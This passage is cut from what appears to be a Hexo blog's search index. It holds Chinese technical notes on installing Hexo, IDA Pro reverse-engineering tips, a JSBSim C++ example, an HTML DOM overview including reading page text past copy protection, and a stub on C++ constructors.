Promise.then.then.result (F:\blog\node_modules\hexo\lib\hexo\render.js:65:19)</span><br><span class="line">    at tryCatcher (F:\blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">    at Promise._settlePromiseFromHandler (F:\blog\node_modules\bluebird\js\release\promise.js:512:31)</span><br><span class="line">    at Promise._settlePromise (F:\blog\node_modules\bluebird\js\release\promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (F:\blog\node_modules\bluebird\js\release\promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (F:\blog\node_modules\bluebird\js\release\promise.js:693:18)</span><br><span class="line">    at Async._drainQueue (F:\blog\node_modules\bluebird\js\release\async.js:133:16)</span><br><span class="line">    at Async._drainQueues (F:\blog\node_modules\bluebird\js\release\async.js:143:10)</span><br><span class="line">    at Immediate.Async.drainQueues (F:\blog\node_modules\bluebird\js\release\async.js:17:14)</span><br><span class="line">    at runCallback (timers.js:705:18)</span><br><span class="line">    at tryOnImmediate (timers.js:676:5)</span><br><span class="line">    at processImmediate (timers.js:658:5)</span><br></pre></td></tr></table></figure>

<p>不想在费劲的查找问题原因，打算重新走一遍hexo+github构建博客流程，于是记录一下。</p>
<h1 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。安装Hexo命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Solve ERROR Deployer not found: git</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>安装最新版本的Hexo之后，发现还是出现文章开始的错误，不过幸运的是，新版本的Hexo给出了错误的位置，经检查是公式输入不对导致解析错误的原因。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>,by hexo.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35668237" target="_blank" rel="noopener">超详细Hexo+Github博客搭建小白教程</a>,by 韦阳.</li>
<li><a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">GitHub+Hexo 搭建个人网站详细教程</a>,by 吴润.</li>
<li><a href="https://github.com/hexojs/hexo/issues/2757" target="_blank" rel="noopener">ERROR Deployer not found: git</a>,by hexo.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo使用帮助</title>
    <url>/2021/05/10/Hexo%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>记录Hexo使用过程的一些经验。</p>
<h1 id="插入图片问题"><a href="#插入图片问题" class="headerlink" title="插入图片问题"></a>插入图片问题</h1><p>请参考<a href="https://hexo.io/docs/asset-folders.html" target="_blank" rel="noopener">Asset Folders</a>。</p>
<h1 id="搜索无效问题"><a href="#搜索无效问题" class="headerlink" title="搜索无效问题"></a>搜索无效问题</h1><p>请参考<a href="https://zhuanlan.zhihu.com/p/361143962" target="_blank" rel="noopener">Hexo博客Next主题站内搜索模块相关，解决搜索无效、一直loading的问题</a>。</p>
<h1 id="Node-js-版本限制"><a href="#Node-js-版本限制" class="headerlink" title="Node.js 版本限制"></a>Node.js 版本限制</h1><table>
<thead>
<tr>
<th>Hexo 版本</th>
<th>最低兼容 Node.js 版本</th>
</tr>
</thead>
<tbody><tr>
<td>6.0+</td>
<td>12.13.0</td>
</tr>
<tr>
<td>5.0+</td>
<td>10.13.0</td>
</tr>
<tr>
<td>4.1 - 4.2</td>
<td>8.10</td>
</tr>
<tr>
<td>4.0</td>
<td>8.6</td>
</tr>
<tr>
<td>3.3 - 3.9</td>
<td>6.9</td>
</tr>
<tr>
<td>3.2 - 3.3</td>
<td>0.12</td>
</tr>
<tr>
<td>3.0 - 3.1</td>
<td>0.10 or iojs</td>
</tr>
<tr>
<td>0.0.1 - 2.8</td>
<td>0.10</td>
</tr>
</tbody></table>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://hexo.io/docs/asset-folders.html" target="_blank" rel="noopener">Asset Folders</a>,by hexo.</li>
<li><a href="http://hellodavid.top/2019/06/07/Hexo+next+busuanzi/" target="_blank" rel="noopener">Hexo Next 解决 Busuanzi 统计浏览失效</a>,by HelloDavid.</li>
<li><a href="https://zhuanlan.zhihu.com/p/361143962" target="_blank" rel="noopener">Hexo博客Next主题站内搜索模块相关，解决搜索无效、一直loading的问题</a>,by AomanHao.</li>
<li><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo文档</a>,by hexo.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA Pro反编译工具使用帮助</title>
    <url>/2022/07/01/IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>IDA Pro为反编译与除错工具, 常用于逆向工程。</p>
<h1 id="PE格式分析"><a href="#PE格式分析" class="headerlink" title="PE格式分析"></a>PE格式分析</h1><p>请参考如下链接：</p>
<ul>
<li><a href="https://img2020.cnblogs.com/blog/1582785/202106/1582785-20210618172306763-821098070.png" target="_blank" rel="noopener">[原创]PE文件结构基础详解</a></li>
</ul>
<h1 id="汇编代码解析"><a href="#汇编代码解析" class="headerlink" title="汇编代码解析"></a>汇编代码解析</h1><p>请参考如下链接：</p>
<ul>
<li><a href="https://52sbl.cn/discussion/28513.html" target="_blank" rel="noopener">在 IDA 中，db 和 dd offset 在数据部分中是什么意思？</a></li>
<li><a href="https://www.cnblogs.com/dongzhiquan/p/4960602.html" target="_blank" rel="noopener">SS, SP, BP 三个寄存器</a></li>
</ul>
<h1 id="操作系统布局"><a href="#操作系统布局" class="headerlink" title="操作系统布局"></a>操作系统布局</h1><p>Windows在默认情况下会将高地址的2GB空间分配给内核（也可以配置为1GB），而Linux默认情况下会将高地址的1GB空间分配给内核。也就是说，应用程序只能使用剩下的2GB或3GB的地址空间，称为用户空间（User Space）。</p>
<p align="center">
    <img src="https://img-blog.csdnimg.cn/20190812101410629.png" width="90%" alt="Windows 32位程序的内存分布"/>
</p>
<center>图1  Windows 32位程序的内存分布</center>

<h1 id="修改汇编指令"><a href="#修改汇编指令" class="headerlink" title="修改汇编指令"></a>修改汇编指令</h1><p>IDA修改汇编指令的方法如下：</p>
<ol>
<li>点击Edit &gt; Patch program &gt; Assemble，修改汇编指令</li>
<li>点击Edit &gt; Patch program &gt; Apply pathes to input file &gt; OK</li>
</ol>
<p>具体细节请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_43206704/article/details/86582543" target="_blank" rel="noopener">IDA修改汇编指令</a></li>
</ul>
<h1 id="显示中文字符"><a href="#显示中文字符" class="headerlink" title="显示中文字符"></a>显示中文字符</h1><blockquote>
<p>IDA从7.0版本开始正式支持中文字符串的显示，但仍需要配置ida.cfg。在IDA\CFG目录下新建文件Chinese.clt，修改 ida.cfg 文件中的ENCODING_CULTURES项目，增添“GB2312:Chinese”。</p>
</blockquote>
<p>具体请参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/474207234" target="_blank" rel="noopener">【逆向】IDA Pro</a></li>
</ul>
<h1 id="QT程序逆向分析"><a href="#QT程序逆向分析" class="headerlink" title="QT程序逆向分析"></a>QT程序逆向分析</h1><p>请参考：</p>
<ul>
<li><a href="https://www.52pojie.cn/thread-497018-1-1.html" target="_blank" rel="noopener">Qt5 程序初步逆向分析+解析脚本</a></li>
<li><a href="https://blog.csdn.net/donglxd/article/details/135601081" target="_blank" rel="noopener">关于一个QT程序的简单破解思路(不需要分析信号和槽的方法,通用所有程序的破解思路)</a></li>
</ul>
<h1 id="调试DLL"><a href="#调试DLL" class="headerlink" title="调试DLL"></a>调试DLL</h1><p>请参考：</p>
<ul>
<li><a href="https://www.idapro.net.cn/jiqiao/ida-dtdll.html" target="_blank" rel="noopener">ida动态调试dll ida动态调试exe</a></li>
</ul>
<h1 id="去除函数调用"><a href="#去除函数调用" class="headerlink" title="去除函数调用"></a>去除函数调用</h1><p>请参考：</p>
<ul>
<li><a href="https://reverseengineering.stackexchange.com/questions/10862/is-it-possible-to-make-an-application-skip-a-call" target="_blank" rel="noopener">Is it possible to make an application skip a call?</a></li>
<li><a href="https://www.yunyawu.com/2020/06/19/ida%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%EF%BC%9A%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E5%8E%9F%E7%90%86%E4%B8%8E%E6%89%8B%E5%8A%A8%E6%81%A2%E5%A4%8D%E5%B9%B3%E8%A1%A1/" target="_blank" rel="noopener">IDA系列教程：堆栈平衡原理与手动恢复平衡</a></li>
<li><a href="https://tommy-3.gitbook.io/my_reverse_book/my_reverse_notes/3.-zhan-pian-yi-ping-heng-yu-ji-suan-shi-yong-ida-ju-li" target="_blank" rel="noopener">3.栈偏移平衡与计算(使用IDA举例)</a></li>
<li><a href="https://blog.csdn.net/u010488395/article/details/8900641" target="_blank" rel="noopener">对call堆栈平衡的一点心得，希望对新手有所帮助</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://alienworm.top/?p=452" target="_blank" rel="noopener">IDA Pro基础</a>,by alienworm.</li>
<li><a href="https://blog.csdn.net/weixin_43921239/article/details/99656809" target="_blank" rel="noopener">(_DWORD )是什么？</a>,by SkYe231_.</li>
<li><a href="https://blog.csdn.net/weixin_45556441/article/details/115599612" target="_blank" rel="noopener">有关(_DWORD *)的解释</a>,by 半岛铁盒@.</li>
<li><a href="https://blog.csdn.net/hgy413/article/details/50594320" target="_blank" rel="noopener">14.IDA-XREF（交叉引用）概述</a>,by 花熊.</li>
<li><a href="https://zhuanlan.zhihu.com/p/136695608" target="_blank" rel="noopener">可否对车的阻力进行量化？当然！</a>,by EV技研.</li>
<li><a href="https://blog.csdn.net/m0_37816922/article/details/120968466" target="_blank" rel="noopener">python弹道初步：帮柱子想办法干他一炮</a>,by 微小冷.</li>
<li><a href="https://52sbl.cn/discussion/28513.html" target="_blank" rel="noopener">在 IDA 中，db 和 dd offset 在数据部分中是什么意思？</a>,by 吾爱随笔录.</li>
<li><a href="https://www.cnblogs.com/dongzhiquan/p/4960602.html" target="_blank" rel="noopener">SS, SP, BP 三个寄存器</a>,by dzqabc.</li>
<li><a href="https://bbs.kanxue.com/thread-277677.htm" target="_blank" rel="noopener">[原创]PE文件结构基础详解</a>,by 黎明与黄昏.</li>
<li><a href="https://blog.csdn.net/qq_37653144/article/details/82978929" target="_blank" rel="noopener">Linux进程的内存空间布局</a>,by ___Blue_H.</li>
<li><a href="https://zhuanlan.zhihu.com/p/265469128" target="_blank" rel="noopener">无法看懂windows内存？那是因为你少了三幅图和一个工具</a>,by Crystal.</li>
<li><a href="https://blog.csdn.net/qq_37655329/article/details/121495298" target="_blank" rel="noopener">Linux、Windows下C语言内存布局（内存模型）</a>,by JayerZhou.</li>
<li><a href="https://www.cnblogs.com/still-smile/p/14900474.html" target="_blank" rel="noopener">（C语言内存十）Windows下C语言程序的内存布局（内存模型）</a>,by still-smile.</li>
<li><a href="https://www.idapro.net.cn/jiqiao/ida-dtdll.html" target="_blank" rel="noopener">ida动态调试dll ida动态调试exe</a>,by idapro.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>JSBSim编程实践之入门</title>
    <url>/2019/03/27/JSBSim%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。JSBSim可以独立运行，通过命令行参数指定飞行器和初始状态，进行简单情境下的飞行动力学仿真，也可以将JSBSim作为代码库，编程实现飞行器模型加载，设置输入，获得输出。下面即介绍在Linux平台编程调用JSBSim库的方法和步骤。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="gcc与g"><a href="#gcc与g" class="headerlink" title="gcc与g++"></a>gcc与g++</h2><p>GNU编译器套装（英语：GNU Compiler Collection，缩写为GCC），指一套编程语言编译器，以GPL及LGPL许可证所发行的自由软件，也是GNU项目的关键部分，也是GNU工具链的主要组成部分之一。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。</p>
<p>通常gcc用于编译链接c代码文件，而g++用于编译链接c++代码文件，但它们的使用方法很类似。下面介绍gcc和g++的常用选项。</p>
<ul>
<li>添加头文件搜索路径</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc foo.c -I &#x2F;home&#x2F;xiaowp&#x2F;include -o foo</span><br></pre></td></tr></table></figure>

<ul>
<li>添加动态库搜索路径</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc foo.c -L &#x2F;home&#x2F;xiaowp&#x2F;lib -lfoo -o foo</span><br></pre></td></tr></table></figure>

<ul>
<li>添加静态库搜索路径</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc foo.c -L &#x2F;home&#x2F;xiaowp&#x2F;lib -static -lfoo -o foo</span><br></pre></td></tr></table></figure>

<h1 id="编程实践"><a href="#编程实践" class="headerlink" title="编程实践"></a>编程实践</h1><h2 id="最简仿真"><a href="#最简仿真" class="headerlink" title="最简仿真"></a>最简仿真</h2><p>下面是JSBSim参考手册中的最简单实例，因JSBSim的不断开发，JSBSim参考手册中该编程实例有点过时，因此进行了少量修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;FGFDMExec.h&gt;</span><br><span class="line">#include &lt;sg_path.hxx&gt;</span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  JSBSim::FGFDMExec FDMExec;</span><br><span class="line">  bool result &#x3D; true;</span><br><span class="line"> </span><br><span class="line">  FDMExec.LoadScript(SGPath::fromUtf8(argv[1]));</span><br><span class="line"> </span><br><span class="line">  while (result) result &#x3D; FDMExec.Run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码可知，调用JSBSim的主要方法是利用FGFDMExec类，通过实例化一个FGFDMExec类，就相当于获得了一个运行JSBSim仿真的工具箱，通过这个工具箱就可以调用JSBSim的大部分功能，实现我们要的仿真目标。</p>
<p>接下来对该实例进行编译链接，使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># jsbsim_script.cpp是上述实例的代码文件</span><br><span class="line">g++ jsbsim_script.cpp -I ..&#x2F;jsbsim&#x2F;src&#x2F; -I..&#x2F;jsbsim&#x2F;src&#x2F;simgear&#x2F;misc  -L ..&#x2F;jsbsim&#x2F;build&#x2F;src&#x2F; -static -l JSBSim -o jsbsim_script</span><br></pre></td></tr></table></figure>

<p>测试该实例，使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># jsbsim是JSBSim项目文件夹</span><br><span class="line"># JSBSimTest是JSBSim测试实例所在文件夹</span><br><span class="line">cd jsbsim</span><br><span class="line">..&#x2F;JSBSimTest&#x2F;jsbsim_script .&#x2F;scripts&#x2F;c1723.xml</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/yu_lei_/article/details/81916143" target="_blank" rel="noopener">JSBSim编程实践</a>,by 32768.</li>
<li><a href="https://www.jianshu.com/p/b372cdfcea25" target="_blank" rel="noopener">战斗机与引擎速查</a>,by 么的聊.</li>
<li><a href="https://www.jianshu.com/p/a0b4598f928a" target="_blank" rel="noopener">JSBSim学习笔记(3)—— 基本概念</a>,by 么的聊.</li>
<li><a href="https://www.jianshu.com/p/b5e9f1f5df95" target="_blank" rel="noopener">JSBSim学习笔记(6)——飞行控制系统</a>,by 么的聊.</li>
<li><a href="https://huangwang.github.io/2019/03/20/Linux平台编译安装测试JSBSim/">Linux平台编译安装测试JSBSim</a>,by jack huang.</li>
<li><a href="http://jsbsim.sourceforge.net/documentation.html" target="_blank" rel="noopener">JSBSim Reference Manual </a>,by jsbsim.</li>
<li><a href="https://www.cnblogs.com/zxouxuewei/p/7263568.html" target="_blank" rel="noopener">gcc和g++头文件和库路径的寻找和添加</a>,by 周学伟.</li>
<li><a href="https://zh.wikipedia.org/wiki/GCC" target="_blank" rel="noopener">GCC</a>,by wikipedia.</li>
<li><a href="https://www.freelancinggig.com/blog/2017/11/10/difference-gcc-g/" target="_blank" rel="noopener">WHAT IS THE DIFFERENCE BETWEEN GCC AND G++</a>,by KITTY GUPTA.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML_DOM文档对象模型简介</title>
    <url>/2019/07/22/HTML-DOM%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>最近要写一些八股文，上网一搜，好多范例，正想下载下来借鉴以下，可惜不让复制粘贴。不过难不倒我，直接使用文档对象模型(Document Object Model，DOM)提供编程接口，将整篇文章下来。</p>
<h1 id="DOM概述"><a href="#DOM概述" class="headerlink" title="DOM概述"></a>DOM概述</h1><h2 id="DOM简介"><a href="#DOM简介" class="headerlink" title="DOM简介"></a>DOM简介</h2><p>文档对象模型 (DOM) 是HTML和XML文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。简言之，它会将web页面和脚本或程序语言连接起来。</p>
<p>一个web页面是一个文档。这个文档可以在浏览器窗口或作为HTML源码显示出来。但上述两个情况中都是同一份文档。文档对象模型（DOM）提供了对同一份文档的另一种表现，存储和操作的方式。 DOM是web页面的完全的面向对象表述，它能够使用如 JavaScript等脚本语言进行修改。</p>
<h2 id="DOM-和-JavaScript"><a href="#DOM-和-JavaScript" class="headerlink" title="DOM 和 JavaScript"></a>DOM 和 JavaScript</h2><p>开始的时候，JavaScript和DOM是交织在一起的，但它们最终演变成了两个独立的实体。JavaScript可以访问和操作存储在DOM中的内容，因此我们可以写成这个近似的等式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">API (web 或 XML 页面) &#x3D; DOM + JS (脚本语言)</span><br></pre></td></tr></table></figure>

<p>DOM 被设计成与特定编程语言相独立，使文档的结构化表述可以通过单一，一致的API获得。尽管通常使用JavaScript操作DOM， 但DOM 也可以使用其他的语言来实现。</p>
<h2 id="DOM访问"><a href="#DOM访问" class="headerlink" title="DOM访问"></a>DOM访问</h2><p>在使用DOM时，您不需要做任何其他特殊的操作。不同的浏览器都有对DOM不同的实现， 这些实现对当前的DOM标准而言，都会呈现出不同程度的一致性，每个web浏览器都会使用一些文档对象模型，从而使页面可以被脚本语言访问。</p>
<p>当您在创建一个脚本时-无论是使用内嵌 &lt;script&gt;元素或者使用在web页面脚本加载的方法— 您都可以使用 document或 window 元素的API来操作文档本身或获取文档的子类（web页面中的各种元素）。</p>
<p>您的DOM编程代码可能会像下面例子一样非常简单，如使用 window对象的alert()函数显示一个警告信息，或者使用比较复杂的方法来创建一个新的内容，如下面内容较长的实例所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onload&#x3D;&quot;window.alert(&#39;welcome to my home page!&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="重要的数据类型"><a href="#重要的数据类型" class="headerlink" title="重要的数据类型"></a>重要的数据类型</h2><p>为简单起见，在API参考文档中的语法实例通常会使用element(s) 指代节点，使用nodeList（s）或 element(s)来指代节点数组，使用 attribute(s)来指代属性节点。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>document</td>
<td>当一个成员返回 document 对象 （例如，元素的 ownerDocument 属性返回它所属于 document ) ，这个对象就是root document 对象本身。 DOM document Reference 一章对 document 对象进行了描述。</td>
</tr>
<tr>
<td>element</td>
<td>element 是指由 DOM API 中成员返回的类型为 element 的一个元素或节点。 例如， document.createElement() 方法会返回一个 node 的对象引用，也就是说这个方法返回了在DOM中创建的 element。 element 对象实现了 DOM Element 接口以及更基本的 Node 接口，参考文档将两者都包含在内。</td>
</tr>
<tr>
<td>nodeList</td>
<td>nodeList 是一个元素的数组，如从 document.getElementsByTagName() 方法返回的就是这种类型。 nodeList 中的条目由通过下标有两种方式进行访问：list.item(1)和list[1]。两种方式是等价的，第一种方式中 item() 是 nodeList 对象中的单独方法。 后面的方式则使用了经典的数组语法来获取列表中的第二个条目。</td>
</tr>
<tr>
<td>attribute</td>
<td>当 attribute 通过成员函数 (例如，通过 createAttribute()方法) 返回时，它是一个为属性暴露出专门接口的对象引用。DOM中的属性也是节点，就像元素一样，只不过您可能会很少使用它。</td>
</tr>
<tr>
<td>namedNodeMap</td>
<td>namedNodeMap 和数组类似，但是条目是由name或index访问的，虽然后一种方式仅仅是为了枚举方便，因为在 list 中本来就没有特定的顺序。 出于这个目的，  namedNodeMap 有一个 item() 方法，你也可以从  namedNodeMap 添加或移除条目。</td>
</tr>
</tbody></table>
<p>DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。</p>
<p>节点的类型有七种。</p>
<ul>
<li>Document：整个文档树的顶层节点</li>
<li>DocumentType：doctype标签（比如&lt;!DOCTYPE html&gt;）</li>
<li>Element：网页的各种HTML标签（比如&lt;body&gt;、&lt;a&gt;等）</li>
<li>Attribute：网页元素的属性（比如class=”right”）</li>
<li>Text：标签之间或标签包含的文本</li>
<li>Comment：注释</li>
<li>DocumentFragment：文档的片段</li>
</ul>
<p>浏览器提供一个原生的节点对象Node，上面这七种节点都继承了Node，因此具有一些共同的属性和方法。</p>
<h2 id="DOM中核心接口"><a href="#DOM中核心接口" class="headerlink" title="DOM中核心接口"></a>DOM中核心接口</h2><p>在DOM编程时，通常使用的最多的就是 Document 和 window 对象。简单的说， window 对象表示浏览器中的内容，而 document 对象是文档本身的根节点。Element 继承了通用的 Node 接口,  将这两个接口结合后就提供了许多方法和属性可以供单个元素使用。在处理这些元素所对应的不同类型的数据时，这些元素可能会有专用的接口，如上节中的  table  对象的例子。</p>
<p>下面是在web和XML页面脚本中使用DOM时，一些常用的API简要列表。</p>
<ul>
<li>document.getElementById(id)</li>
<li>document.getElementsByTagName(name)</li>
<li>document.createElement(name)</li>
<li>parentNode.appendChild(node)</li>
<li>element.innerHTML</li>
<li>element.style.left</li>
<li>element.setAttribute()</li>
<li>element.getAttribute()</li>
<li>element.addEventListener()</li>
<li>window.content</li>
<li>window.onload</li>
<li>window.dump()</li>
<li>window.scrollTo()</li>
</ul>
<h2 id="Element的尺寸"><a href="#Element的尺寸" class="headerlink" title="Element的尺寸"></a>Element的尺寸</h2><ul>
<li>scrollWidth：对象的实际内容的宽度，不包边线宽度，会随对象中内容超过可视区后而变大。</li>
<li>clientWidth：对象内容的可视区的宽度，不包滚动条等边线，会随对象显示大小的变化而改变。</li>
<li>offsetWidth：对象整体的实际宽度，包滚动条等边线，会随对象显示大小的变化而改变。</li>
</ul>
<p>当元素内容没有超过可视区域</p>
<p>元素内无内容或者内容不超过可视区，滚动不出现或不可用的情况下。</p>
<p>scrollWidth=clientWidth，两者皆为内容可视区的宽度。</p>
<p>offsetWidth为元素的实际宽度。</p>
<h1 id="文档下载实战"><a href="#文档下载实战" class="headerlink" title="文档下载实战"></a>文档下载实战</h1><p>以<a href="http://www.gwyxiezuo.com/cailiao/pouxi/2018-11-23/486dbfad4cf89816bef7921d14a11311.html" target="_blank" rel="noopener">示例范文</a>为例，提取其中内容。</p>
<h2 id="禁止复制粘贴的原理"><a href="#禁止复制粘贴的原理" class="headerlink" title="禁止复制粘贴的原理"></a>禁止复制粘贴的原理</h2><ul>
<li>阻止默认的事件响应</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">&#x2F;&#x2F; 禁止右键菜单</span><br><span class="line">document.oncontextmenu &#x3D; function()&#123; return false; &#125;;</span><br><span class="line">&#x2F;&#x2F; 禁止文字选择</span><br><span class="line">document.onselectstart &#x3D; function()&#123; return false; &#125;;</span><br><span class="line">&#x2F;&#x2F; 禁止复制</span><br><span class="line">document.oncopy &#x3D; function()&#123; return false; &#125;;</span><br><span class="line">&#x2F;&#x2F; 禁止剪切</span><br><span class="line">document.oncut &#x3D; function()&#123; return false; &#125;;</span><br><span class="line">&#x2F;&#x2F; 禁止粘贴</span><br><span class="line">document.onpaste &#x3D; function()&#123; return false; &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>CSS阻止用户选择</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.style &#123;</span><br><span class="line">    user-select: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="破解禁止复制粘贴"><a href="#破解禁止复制粘贴" class="headerlink" title="破解禁止复制粘贴"></a>破解禁止复制粘贴</h2><p>使用chrome打开该网页，在使用快捷键ctrl+shift+i，打开开发者工具，找到文档节点DIV的id为article，使用如下代码提取文章内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var node&#x3D;document.getElementById(&#39;article&#39;)</span><br><span class="line">console.log(node.innerText)</span><br></pre></td></tr></table></figure>

<h1 id="DOM事件机制"><a href="#DOM事件机制" class="headerlink" title="DOM事件机制"></a>DOM事件机制</h1><p>请参考<a href="https://blog.csdn.net/antony1776/article/details/121589875" target="_blank" rel="noopener">DOM的事件机制，以及事件的捕获与冒泡</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://javascript.ruanyifeng.com/dom/node.html" target="_blank" rel="noopener">DOM 模型概述</a>,by 阮一峰.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">DOM概述</a>,by MDN web DOC.</li>
<li><a href="http://blog.haoji.me/disable-html-copy-and-paste.html?from=xa" target="_blank" rel="noopener">网页上如何实现禁止复制粘贴以及如何破解</a>,by 小茗同学.</li>
<li><a href="https://juejin.cn/post/6844903764659273741" target="_blank" rel="noopener">scrollWidth,clientWidth,offsetWidth等等的区别</a>,by 南果梨.</li>
<li><a href="https://www.jianshu.com/p/44abcc626318" target="_blank" rel="noopener">javascript中top、clientTop、scrollTop、offsetTop的讲解</a>,by 小豆soybean.</li>
<li><a href="https://www.cnblogs.com/gagarinwjj/p/conflict_client_offset_scroll.html" target="_blank" rel="noopener">令人头疼的clientTop、scrollTop、offsetTop</a>,by 凌晨风.</li>
<li><a href="https://blog.csdn.net/antony1776/article/details/121589875" target="_blank" rel="noopener">DOM的事件机制，以及事件的捕获与冒泡</a>,by 墨城之左.</li>
<li><a href="https://juejin.cn/post/7070376262321045511" target="_blank" rel="noopener">DOM事件机制以及事件委托总结</a>,by 余小兔.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus父类子类构造函数的初始化过程</title>
    <url>/2021/12/18/CPlusPlus%E7%88%B6%E7%B1%BB%E5%AD%90%E7%B1%BB%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>创建子类对象时，子类构造函数和父类构造函数的调用过程值得好好研究。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/sevenjoin/article/details/82222895" target="_blank" rel="noopener">c++ 子类构造函数初始化及父类构造初始化</a>,by sevencheng798.</li>
<li><a href="https://www.runoob.com/cplusplus/cpp-constructor-destructor.html" target="_blank" rel="noopener">C++ 类构造函数 &amp; 析构函数</a>,by runoob.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Goolge C++风格指南学习笔记</title>
    <url>/2022/09/19/Goolge-C-%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
